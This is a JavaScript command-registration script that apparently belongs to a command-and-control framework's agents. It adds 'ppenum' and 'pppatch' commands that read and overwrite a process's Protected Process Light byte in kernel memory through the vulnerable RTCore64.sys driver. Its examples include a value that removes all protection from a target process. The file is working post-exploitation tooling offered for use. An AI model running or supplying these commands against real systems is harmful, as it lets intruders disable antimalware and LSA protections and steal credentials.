var metadata = {
    name: "PPL-BOF",
    description: "PPL (Protected Process Light) enumeration and patch via RTCore64.sys."
};

// ============================================================================
// ppenum
// ============================================================================

var cmd_ppenum = ax.create_command("ppenum",
    "Read _PS_PROTECTION from EPROCESS for a given PID.\nRequires: sc start RTCore64",
    "ppenum 1008");

cmd_ppenum.addArgInt("pid", true, "Target PID");

cmd_ppenum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var pid = parsed_json["pid"] || 0;
    if (pid === 0) {
        ax.execute_alias(id, cmdline, `echo`, "Usage: ppenum <pid>", null);
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/ppenum_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("int", [pid]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: enum PPL for PID " + pid, null);
});

// ============================================================================
// pppatch
// ============================================================================

var cmd_pppatch = ax.create_command("pppatch",
    "Patch _PS_PROTECTION in EPROCESS via RTCore64.sys.\nRequires: sc start RTCore64\n\n[value] examples:\n  0x00 = remove all protection\n  0x31 = ProtectedLight + Antimalware\n  0x41 = ProtectedLight + Lsa\n  0x61 = ProtectedLight + Windows\n  0x71 = ProtectedLight + WinTcb\n  0x72 = Protected + WinTcb",
    "pppatch 1008 0x00\npppatch 1008 0x41\npppatch 5643 0x72");

cmd_pppatch.addArgInt("pid",   true, "Target PID");
cmd_pppatch.addArgString("value", true, "Protection byte value (hex or decimal, e.g. 0x41 or 65)");

cmd_pppatch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var pid   = parsed_json["pid"]   || 0;
    var value = parsed_json["value"] || "";
    if (pid === 0 || value === "") {
        ax.execute_alias(id, cmdline, `echo`, "Usage: pppatch <pid> <value>  (e.g. pppatch 768 0x41)", null);
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/pppatch_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("int,wstr", [pid, value]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: patch PPL for PID " + pid + " -> " + value, null);
});

// ============================================================================
// Register group
// ============================================================================

var group_ppl = ax.create_commands_group("Kernel Tradecraft", [
    cmd_ppenum,
    cmd_pppatch
]);
ax.register_commands_group(group_ppl, ["beacon", "gopher", "kharon"], ["windows"], []);
